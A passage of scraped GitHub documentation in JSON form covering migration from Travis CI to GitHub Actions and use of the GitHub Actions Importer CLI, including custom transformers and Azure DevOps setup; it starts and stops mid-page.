        "text": "GitHub Actions includes integrated support for artifact storage, allowing you to share files between jobs in a workflow. You can also save the resulting files and share them with other workflows. For more information, seeUnderstanding GitHub Actions."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Hosting your own runners"
      },
      {
        "type": "paragraph",
        "text": "If your jobs require specific hardware or software, GitHub Actions allows you to host your own runners and send your jobs to them for processing. GitHub Actions also lets you use policies to control how these runners are accessed, granting access at the organization or repository level. For more information, seeHosting your own runners."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Concurrent jobs and execution time"
      },
      {
        "type": "paragraph",
        "text": "The concurrent jobs and workflow execution times in GitHub Actions can vary depending on your GitHub plan. For more information, seeUsage limits, billing, and administration."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Using different languages in GitHub Actions"
      },
      {
        "type": "paragraph",
        "text": "When working with different languages in GitHub Actions, you can create a step in your job to set up your language dependencies. For more information about working with a particular language, seeBuilding and testing."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Executing scripts"
      },
      {
        "type": "paragraph",
        "text": "GitHub Actions can userunsteps to run scripts or shell commands. To use a particular shell, you can specify theshelltype when providing the path to the script. For more information, seeWorkflow syntax for GitHub Actions."
      },
      {
        "type": "paragraph",
        "text": "For example:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "steps:\n  - name: Run build script\n    run: ./.github/scripts/build.sh\n    shell: bash"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Error handling in GitHub Actions"
      },
      {
        "type": "paragraph",
        "text": "When migrating to GitHub Actions, there are different approaches to error handling that you might need to be aware of."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Script error handling"
      },
      {
        "type": "paragraph",
        "text": "GitHub Actions stops a job immediately if one of the steps returns an error code. For more information, seeWorkflow syntax for GitHub Actions."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Job error handling"
      },
      {
        "type": "paragraph",
        "text": "GitHub Actions usesifconditionals to execute jobs or steps in certain situations. For example, you can run a step when another step results in afailure(). For more information, seeWorkflow syntax for GitHub Actions. You can also usecontinue-on-errorto prevent a workflow run from stopping when a job fails."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Migrating syntax for conditionals and expressions"
      },
      {
        "type": "paragraph",
        "text": "To run jobs under conditional expressions, Travis CI and GitHub Actions share a similarifcondition syntax. GitHub Actions lets you use theifconditional to prevent a job or step from running unless a condition is met. For more information, seeEvaluate expressions in workflows and actions."
      },
      {
        "type": "paragraph",
        "text": "This example demonstrates how anifconditional can control whether a step is executed:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "jobs:\n  conditional:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo \"This step runs with str equals 'ABC' and num equals 123\"\n        if: env.str == 'ABC' && env.num == 123"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Migrating phases to steps"
      },
      {
        "type": "paragraph",
        "text": "Where Travis CI usesphasesto runsteps, GitHub Actions hasstepswhich executeactions. You can find prebuilt actions in theGitHub Marketplace, or you can create your own actions. For more information, seeSharing automations."
      },
      {
        "type": "paragraph",
        "text": "Below is an example of the syntax for each system."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Travis CI syntax for phases and steps"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "language: python\npython:\n  - \"3.7\"\n\nscript:\n  - python script.py"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "GitHub Actions syntax for steps and actions"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "jobs:\n  run_python:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/setup-python@v5\n        with:\n          python-version: '3.7'\n          architecture: 'x64'\n      - run: python script.py"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Caching dependencies"
      },
      {
        "type": "paragraph",
        "text": "Travis CI and GitHub Actions let you manually cache dependencies for later reuse."
      },
      {
        "type": "paragraph",
        "text": "These examples demonstrate the cache syntax for each system."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Travis CI syntax for caching"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "language: node_js\ncache: npm"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "GitHub Actions syntax for caching"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "- name: Cache node modules\n  uses: actions/cache@v4\n  with:\n    path: ~/.npm\n    key: v1-npm-deps-${{ hashFiles('**/package-lock.json') }}\n    restore-keys: v1-npm-deps-"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Examples of common tasks"
      },
      {
        "type": "paragraph",
        "text": "This section compares how GitHub Actions and Travis CI perform common tasks."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Configuring environment variables"
      },
      {
        "type": "paragraph",
        "text": "You can create custom environment variables in a GitHub Actions job."
      },
      {
        "type": "heading",
        "level": 4,
        "text": "Travis CI syntax for an environment variable"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "env:\n  - MAVEN_PATH=\"/usr/local/maven\""
      },
      {
        "type": "heading",
        "level": 4,
        "text": "GitHub Actions workflow with an environment variable"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "jobs:\n  maven-build:\n    env:\n      MAVEN_PATH: '/usr/local/maven'"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Building with Node.js"
      },
      {
        "type": "heading",
        "level": 4,
        "text": "Travis CI for building with Node.js"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "install:\n  - npm install\nscript:\n  - npm run build\n  - npm test"
      },
      {
        "type": "heading",
        "level": 4,
        "text": "GitHub Actions workflow for building with Node.js"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "name: Node.js CI\non: [push]\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      - name: Use Node.js\n        uses: actions/setup-node@v4\n        with:\n          node-version: '16.x'\n      - run: npm install\n      - run: npm run build\n      - run: npm test"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Next steps"
      },
      {
        "type": "paragraph",
        "text": "To continue learning about the main features of GitHub Actions, seeWriting workflows."
      }
    ]
  },
  {
    "url": "https://docs.github.com/en/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/automating-migration-with-github-actions-importer",
    "content": [
      {
        "type": "paragraph",
        "text": "Legal notice"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "About GitHub Actions Importer"
      },
      {
        "type": "paragraph",
        "text": "You can use GitHub Actions Importer to plan and automatically migrate your CI/CD supported pipelines to GitHub Actions."
      },
      {
        "type": "paragraph",
        "text": "GitHub Actions Importer is distributed as a Docker container, and uses aGitHub CLIextension to interact with the container."
      },
      {
        "type": "paragraph",
        "text": "Any workflow that is converted by the GitHub Actions Importer should be inspected for correctness before using it as a production workload. The goal is to achieve an 80% conversion rate for every workflow, however, the actual conversion rate will depend on the makeup of each individual pipeline that is converted."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Supported CI platforms"
      },
      {
        "type": "paragraph",
        "text": "You can use GitHub Actions Importer to migrate from the following platforms:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Azure DevOps",
          "Bamboo",
          "Bitbucket Pipelines",
          "CircleCI",
          "GitLab (both cloud and self-hosted)",
          "Jenkins",
          "Travis CI"
        ]
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Prerequisites"
      },
      {
        "type": "paragraph",
        "text": "GitHub Actions Importer has the following requirements:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "An environment where you can run Linux-based containers, and can install the necessary tools.Docker isinstalledand running.GitHub CLIis installed.NoteThe GitHub Actions Importer container and CLI do not need to be installed on the same server as your CI platform.",
          "Docker isinstalledand running.",
          "GitHub CLIis installed."
        ]
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Installing the GitHub Actions Importer CLI extension"
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "Install the GitHub Actions Importer CLI extension:Bashgh extension install github/gh-actions-importergh extension install github/gh-actions-importer",
          "Verify that the extension is installed:$ gh actions-importer -h\nOptions:\n  -?, -h, --helpShowhelpand usage information\n\nCommands:\n  update     Update to the latest version of GitHub Actions Importer.\n  version    Display the version of GitHub Actions Importer.\n  configure  Start an interactive prompt to configure credentials used to authenticate with your CI server(s).\n  audit      Plan your CI/CD migration by analyzing your current CI/CD footprint.\n  forecast   Forecast GitHub Actions usage from historical pipeline utilization.\n  dry-run    Convert a pipeline to a GitHub Actions workflow and output its yaml file.\n  migrate    Convert a pipeline to a GitHub Actions workflow and open a pull request with the changes."
        ]
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Updating the GitHub Actions Importer CLI"
      },
      {
        "type": "paragraph",
        "text": "To ensure you're running the latest version of GitHub Actions Importer, you should regularly run theupdatecommand:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "gh actions-importer update"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Authenticating at the command line"
      },
      {
        "type": "paragraph",
        "text": "You must configure credentials that allow GitHub Actions Importer to communicate with GitHub and your current CI server. You can configure these credentials using environment variables or a.env.localfile. The environment variables can be configured in an interactive prompt, by running the following command:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "gh actions-importer configure"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Using the GitHub Actions Importer CLI"
      },
      {
        "type": "paragraph",
        "text": "Use the subcommands ofgh actions-importerto begin your migration to GitHub Actions, includingaudit,forecast,dry-run, andmigrate."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Auditing your existing CI pipelines"
      },
      {
        "type": "paragraph",
        "text": "Theauditsubcommand can be used to plan your CI/CD migration by analyzing your current CI/CD footprint. This analysis can be used to plan a timeline for migrating to GitHub Actions."
      },
      {
        "type": "paragraph",
        "text": "To run an audit, use the following command to determine your available options:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "$ gh actions-importer audit -h\nDescription:\n  Plan your CI/CD migration by analyzing your current CI/CD footprint.\n\n[...]\n\nCommands:\n  azure-devops  An audit will output a list of data used in an Azure DevOps instance.\n  bamboo        An audit will output a list of data used in a Bamboo instance.\n  circle-ci     An audit will output a list of data used in a CircleCI instance.\n  gitlab        An audit will output a list of data used in a GitLab instance.\n  jenkins       An audit will output a list of data used in a Jenkins instance.\n  travis-ci     An audit will output a list of data used in a Travis CI instance."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Forecasting usage"
      },
      {
        "type": "paragraph",
        "text": "Theforecastsubcommand reviews historical pipeline usage to create a forecast of GitHub Actions usage."
      },
      {
        "type": "paragraph",
        "text": "To run a forecast, use the following command to determine your available options:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "$ gh actions-importer forecast -h\nDescription:\n  Forecasts GitHub Actions usage from historical pipeline utilization.\n\n[...]\n\nCommands:\n  azure-devops  Forecasts GitHub Actions usage from historical Azure DevOps pipeline utilization.\n  bamboo        Forecasts GitHub Actions usage from historical Bamboo pipeline utilization.\n  jenkins       Forecasts GitHub Actions usage from historical Jenkins pipeline utilization.\n  gitlab        Forecasts GitHub Actions usage from historical GitLab pipeline utilization.\n  circle-ci     Forecasts GitHub Actions usage from historical CircleCI pipeline utilization.\n  travis-ci     Forecasts GitHub Actions usage from historical Travis CI pipeline utilization.\n  github        Forecasts GitHub Actions usage from historical GitHub pipeline utilization."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Testing the migration process"
      },
      {
        "type": "paragraph",
        "text": "Thedry-runsubcommand can be used to convert a pipeline to its GitHub Actions equivalent, and then write the workflow to your local filesystem."
      },
      {
        "type": "paragraph",
        "text": "To perform a dry run, use the following command to determine your available options:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "$ gh actions-importer dry-run -h\nDescription:\n  Convert a pipeline to a GitHub Actions workflow and output its yaml file.\n\n[...]\n\nCommands:\n  azure-devops  Convert an Azure DevOps pipeline to a GitHub Actions workflow and output its yaml file.\n  bamboo        Convert a Bamboo pipeline to GitHub Actions workflows and output its yaml file.\n  circle-ci     Convert a CircleCI pipeline to GitHub Actions workflows and output the yaml file(s).\n  gitlab        Convert a GitLab pipeline to a GitHub Actions workflow and output the yaml file.\n  jenkins       Convert a Jenkins job to a GitHub Actions workflow and output its yaml file.\n  travis-ci     Convert a Travis CI pipeline to a GitHub Actions workflow and output its yaml file."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Migrating a pipeline to GitHub Actions"
      },
      {
        "type": "paragraph",
        "text": "Themigratesubcommand can be used to convert a pipeline to its GitHub Actions equivalent and then create a pull request with the contents."
      },
      {
        "type": "paragraph",
        "text": "To run a migration, use the following command to determine your available options:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "$ gh actions-importer migrate -h\nDescription:\n  Convert a pipeline to a GitHub Actions workflow and open a pull request with the changes.\n\n[...]\n\nCommands:\n  azure-devops  Convert an Azure DevOps pipeline to a GitHub Actions workflow and open a pull request with the changes.\n  bamboo        Convert a Bamboo pipeline to GitHub Actions workflows and open a pull request with the changes.\n  circle-ci     Convert a CircleCI pipeline to GitHub Actions workflows and open a pull request with the changes.\n  gitlab        Convert a GitLab pipeline to a GitHub Actions workflow and open a pull request with the changes.\n  jenkins       Convert a Jenkins job to a GitHub Actions workflow and open a pull request with the changes.\n  travis-ci     Convert a Travis CI pipeline to a GitHub Actions workflow and open a pull request with the changes."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Performing self-serve migrations using IssueOps"
      },
      {
        "type": "paragraph",
        "text": "You can use GitHub Actions and GitHub Issues to run CLI commands for GitHub Actions Importer. This allows you to migrate your CI/CD workflows without installing software on your local machine. This approach is especially useful for organizations that want to enable self-service migrations to GitHub Actions. Once IssueOps is configured, users can open an issue with the relevant template to migrate pipelines to GitHub Actions."
      },
      {
        "type": "paragraph",
        "text": "For more information about setting up self-serve migrations with IssueOps, see theactions/importer-issue-opstemplate repository."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Using the GitHub Actions Importer labs repository"
      },
      {
        "type": "paragraph",
        "text": "The GitHub Actions Importer labs repository contains platform-specific learning paths that teach you how to use GitHub Actions Importer and how to approach migrations to GitHub Actions. You can use this repository to learn how to use GitHub Actions Importer to help plan, forecast, and automate your migration to GitHub Actions."
      },
      {
        "type": "paragraph",
        "text": "To learn more, see theGitHub Actions Importer labs repository."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Legal notice"
      },
      {
        "type": "paragraph",
        "text": "Portions have been adapted fromhttps://github.com/github/gh-actions-importer/under the MIT license:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "MIT License\n\nCopyright (c) 2022 GitHub\n\nPermission is hereby granted, free of charge, to any person obtaining a copy\nof this software and associated documentation files (the \"Software\"), to deal\nin the Software without restriction, including without limitation the rights\nto use, copy, modify, merge, publish, distribute, sublicense, and/or sell\ncopies of the Software, and to permit persons to whom the Software is\nfurnished to do so, subject to the following conditions:\n\nThe above copyright notice and this permission notice shall be included in all\ncopies or substantial portions of the Software.\n\nTHE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\nIMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\nFITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\nAUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\nLIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\nOUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE\nSOFTWARE."
      }
    ]
  },
  {
    "url": "https://docs.github.com/en/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/extending-github-actions-importer-with-custom-transformers",
    "content": [
      {
        "type": "paragraph",
        "text": "Legal notice"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "About custom transformers"
      },
      {
        "type": "paragraph",
        "text": "GitHub Actions Importer offers the ability to extend its built-in mapping by creating custom transformers. Custom transformers can be used to:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Convert items that GitHub Actions Importer does not automatically convert, or modify how items are converted. For more information, seeCreating custom transformers for items.",
          "Convert references to runners to use different runner labels. For more information, seeCreating custom transformers for runners.",
          "Convert environment variable values from your existing pipelines to GitHub Actions workflows. For more information, seeCreating custom transformers for environment variables."
        ]
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Using custom transformers with GitHub Actions Importer"
      },
      {
        "type": "paragraph",
        "text": "A custom transformer contains mapping logic that GitHub Actions Importer can use to transform your plugins, tasks, runner labels, or environment variables to work with GitHub Actions. Custom transformers are written with a domain-specific language (DSL) built on top of Ruby, and are defined within a file with the.rbfile extension."
      },
      {
        "type": "paragraph",
        "text": "You can use the--custom-transformersCLI option to specify which custom transformer files to use with theaudit,dry-run, andmigratecommands."
      },
      {
        "type": "paragraph",
        "text": "For example, if custom transformers are defined in a file namedtransformers.rb, you can use the following command to use them with GitHub Actions Importer:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "gh actions-importer ... --custom-transformers transformers.rb"
      },
      {
        "type": "paragraph",
        "text": "Alternatively, you can use the glob pattern syntax to specify multiple custom transformer files. For example, if multiple custom transformer files are within a directory namedtransformers, you can provide them all to GitHub Actions Importer with the following command:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "gh actions-importer ... --custom-transformers transformers/*.rb"
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "When you use custom transformers, the custom transformer files must reside in the same directory, or in subdirectories, from where thegh actions-importercommand is run."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Creating custom transformers for items"
      },
      {
        "type": "paragraph",
        "text": "You can create custom transformers that GitHub Actions Importer will use when converting existing build steps or triggers to their equivalent in GitHub Actions. This is especially useful when:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "GitHub Actions Importer doesn't automatically convert an item.",
          "You want to change how an item is converted by GitHub Actions Importer.",
          "Your existing pipelines use custom or proprietary extensions, such as shared libraries in Jenkins, and you need to define how these steps should function in GitHub Actions."
        ]
      },
      {
        "type": "paragraph",
        "text": "GitHub Actions Importer uses custom transformers that are defined using a DSL built on top of Ruby. In order to create custom transformers for build steps and triggers:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Each custom transformer file must contain at least onetransformmethod.",
          "Eachtransformmethod must return aHash, an array ofHash's, ornil. This returned value will correspond to an action defined in YAML. For more information about actions, seeUnderstanding GitHub Actions."
        ]
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Example custom transformer for a build step"
      },
      {
        "type": "paragraph",
        "text": "The following example converts a build step that uses the \"buildJavaScriptApp\" identifier to run variousnpmcommands:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "transform \"buildJavaScriptApp\" do |item|\n  command = [\"build\", \"package\", \"deploy\"].map do |script|\n    \"npm run #{script}\"\n  end\n\n  {\n    name: \"build javascript app\",\n    run: command.join(\"\\n\")\n  }\nend"
      },
      {
        "type": "paragraph",
        "text": "The above example results in the following GitHub Actions workflow step. It is comprised of converted build steps that had abuildJavaScriptAppidentifier:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "- name: build javascript app\n  run: |\n    npm run build\n    npm run package\n    npm run deploy"
      },
      {
        "type": "paragraph",
        "text": "Thetransformmethod uses the identifier of the build step from your source CI/CD instance in an argument. In this example, the identifier isbuildJavaScriptLibrary. You can also use comma-separated values to pass multiple identifiers to thetransformmethod. For example,transform \"buildJavaScriptApp\", \"buildTypeScriptApp\" { |item| ... }."
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "The data structure ofitemwill be different depending on the CI/CD platform and the type of item being converted."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Creating custom transformers for runners"
      },
      {
        "type": "paragraph",
        "text": "You can customize the mapping between runners in your source CI/CD instance and their equivalent GitHub Actions runners."
      },
      {
        "type": "paragraph",
        "text": "GitHub Actions Importer uses custom transformers that are defined using a DSL built on top of Ruby. To create custom transformers for runners:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "The custom transformer file must have at least onerunnermethod.",
          "Therunnermethod accepts two parameters. The first parameter is the source CI/CD instance's runner label, and the second parameter is the corresponding GitHub Actions runner label. For more information on GitHub Actions runners, seeUsing GitHub-hosted runners."
        ]
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Example custom transformers for runners"
      },
      {
        "type": "paragraph",
        "text": "The following example shows arunnermethod that converts one runner label to one GitHub Actions runner label in the resulting workflow."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "runner \"linux\", \"ubuntu-latest\""
      },
      {
        "type": "paragraph",
        "text": "You can also use therunnermethod to convert one runner label to multiple GitHub Actions runner labels in the resulting workflow."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "runner \"big-agent\", [\"self-hosted\", \"xl\", \"linux\"]"
      },
      {
        "type": "paragraph",
        "text": "GitHub Actions Importer attempts to map the runner label as best it can. In cases where it cannot do this, theubuntu-latestrunner label is used as a default. You can use a special keyword with therunnermethod to control this default value. For example, the following custom transformer instructs GitHub Actions Importer to usemacos-latestas the default runner instead ofubuntu-latest."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "runner :default, \"macos-latest\""
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Creating custom transformers for environment variables"
      },
      {
        "type": "paragraph",
        "text": "You can customize the mapping between environment variables in your source CI/CD pipelines to their values in GitHub Actions."
      },
      {
        "type": "paragraph",
        "text": "GitHub Actions Importer uses custom transformers that are defined using a DSL built on top of Ruby. To create custom transformers for environment variables:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "The custom transformer file must have at least oneenvmethod.",
          "Theenvmethod accepts two parameters. The first parameter is the name of the environment variable in the original pipeline, and the second parameter is the updated value for the environment variable for GitHub Actions. For more information about GitHub Actions environment variables, seeStore information in variables."
        ]
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Example custom transformers for environment variables"
      },
      {
        "type": "paragraph",
        "text": "There are several ways you can set up custom transformers to map your environment variables."
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "The following example sets the value of any existing environment variables namedOCTO, toCATwhen transforming a pipeline.Rubyenv \"OCTO\", \"CAT\"env\"OCTO\",\"CAT\"You can also remove all instances of a specific environment variable so they are not transformed to an GitHub Actions workflow. The following example removes all environment variables with the nameMONA_LISA.Rubyenv \"MONA_LISA\", nilenv\"MONA_LISA\",nil",
          "You can also map your existing environment variables to secrets. For example, the followingenvmethod maps an environment variable namedMONALISAto a secret namedOCTOCAT.Rubyenv \"MONALISA\", secret(\"OCTOCAT\")env\"MONALISA\", secret(\"OCTOCAT\")This will set up a reference to a secret namedOCTOCATin the transformed workflow. For the secret to work, you will need to create the secret in your GitHub repository. For more information, seeUsing secrets in GitHub Actions.",
          "You can also use regular expressions to update the values of multiple environment variables at once. For example, the following custom transformer removes all environment variables from the converted workflow:Rubyenv /.*/, nilenv /.*/, nilThe following example uses a regular expression match group to transform environment variable values to dynamically generated secrets.Rubyenv /^(.+)_SSH_KEY/, secret(\"%s_SSH_KEY)env /^(.+)_SSH_KEY/, secret(\"%s_SSH_KEY)NoteThe order in whichenvmethods are defined matters when using regular expressions. The firstenvtransformer that matches an environment variable name takes precedence over subsequentenvmethods. You should define your most specific environment variable transformers first."
        ]
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Legal notice"
      },
      {
        "type": "paragraph",
        "text": "Portions have been adapted fromhttps://github.com/github/gh-actions-importer/under the MIT license:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "MIT License\n\nCopyright (c) 2022 GitHub\n\nPermission is hereby granted, free of charge, to any person obtaining a copy\nof this software and associated documentation files (the \"Software\"), to deal\nin the Software without restriction, including without limitation the rights\nto use, copy, modify, merge, publish, distribute, sublicense, and/or sell\ncopies of the Software, and to permit persons to whom the Software is\nfurnished to do so, subject to the following conditions:\n\nThe above copyright notice and this permission notice shall be included in all\ncopies or substantial portions of the Software.\n\nTHE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\nIMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\nFITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\nAUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\nLIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\nOUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE\nSOFTWARE."
      }
    ]
  },
  {
    "url": "https://docs.github.com/en/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/migrating-from-azure-devops-with-github-actions-importer",
    "content": [
      {
        "type": "paragraph",
        "text": "Legal notice"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "About migrating from Azure DevOps with GitHub Actions Importer"
      },
      {
        "type": "paragraph",
        "text": "The instructions below will guide you through configuring your environment to use GitHub Actions Importer to migrate Azure DevOps pipelines to GitHub Actions."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Prerequisites"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "An Azure DevOps account or organization with projects and pipelines that you want to convert to GitHub Actions workflows.",
          "Access to create an Azure DevOps personal access token for your account or organization.",
          "An environment where you can run Linux-based containers, and can install the necessary tools.Docker isinstalledand running.GitHub CLIis installed.NoteThe GitHub Actions Importer container and CLI do not need to be installed on the same server as your CI platform.",
          "Docker isinstalledand running.",
          "GitHub CLIis installed."
        ]
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Limitations"
      },
      {
        "type": "paragraph",
        "text": "There are some limitations when migrating from Azure DevOps to GitHub Actions with GitHub Actions Importer:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "GitHub Actions Importer requires version 5.0 of the Azure DevOps API, available in either Azure DevOps Services or Azure DevOps Server 2019. Older versions of Azure DevOps Server are not compatible.",
          "Tasks that are implicitly added to an Azure DevOps pipeline, such as checking out source code, may be added to a GitHub Actions Importer audit as a GUID name. To find the friendly task name for a GUID, you can use the following URL:https://dev.azure.com/:organization/_apis/distributedtask/tasks/:guid."
        ]
      },
      {
        "type": "heading",
        "level": 4,
        "text": "Manual tasks"
      },
      {
        "type": "paragraph",
        "text": "Certain Azure DevOps constructs must be migrated manually from Azure DevOps into GitHub Actions configurations. These include:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Organization, repository, and environment secrets",
          "Service connections such as OIDC Connect, GitHub Apps, and personal access tokens",
          "Unknown tasks",
          "Self-hosted agents",
          "Environments",
          "Pre-deployment approvals"
        ]
      },
      {
        "type": "paragraph",
        "text": "For more information on manual migrations, seeMigrating from Azure Pipelines to GitHub Actions."
      },
      {
        "type": "heading",
        "level": 4,
        "text": "Unsupported tasks"
      },
      {
        "type": "paragraph",
        "text": "GitHub Actions Importer does not support migrating the following tasks:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Pre-deployment gates",
          "Post-deployment gates",
          "Post-deployment approvals",
          "Some resource triggers"
        ]
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Installing the GitHub Actions Importer CLI extension"
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "Install the GitHub Actions Importer CLI extension:Bashgh extension install github/gh-actions-importergh extension install github/gh-actions-importer",
          "Verify that the extension is installed:$ gh actions-importer -h\nOptions:\n  -?, -h, --helpShowhelpand usage information\n\nCommands:\n  update     Update to the latest version of GitHub Actions Importer.\n  version    Display the version of GitHub Actions Importer.\n  configure  Start an interactive prompt to configure credentials used to authenticate with your CI server(s).\n  audit      Plan your CI/CD migration by analyzing your current CI/CD footprint.\n  forecast   Forecast GitHub Actions usage from historical pipeline utilization.\n  dry-run    Convert a pipeline to a GitHub Actions workflow and output its yaml file.\n  migrate    Convert a pipeline to a GitHub Actions workflow and open a pull request with the changes."
        ]
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Configuring credentials"
      },
      {
        "type": "paragraph",
        "text": "TheconfigureCLI command is used to set required credentials and options for GitHub Actions Importer when working with Azure DevOps and GitHub."
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "Create a GitHub personal access token (classic). For more information, seeManaging your personal access tokens.Your token must have theworkflowscope.After creating the token, copy it and save it in a safe location for later use.",
          "Create an Azure DevOps personal access token. For more information, seeUse personal access tokensin the Azure DevOps documentation. The token must have the following scopes:Agents Pool:ReadBuild:ReadCode:ReadRelease:ReadService Connections:ReadTask Groups:ReadVariable Groups:ReadAfter creating the token, copy it and save it in a safe location for later use.",
          "Agents Pool:Read",
          "Build:Read",
          "Code:Read",
          "Release:Read",
          "Service Connections:Read",
          "Task Groups:Read",
          "Variable Groups:Read",
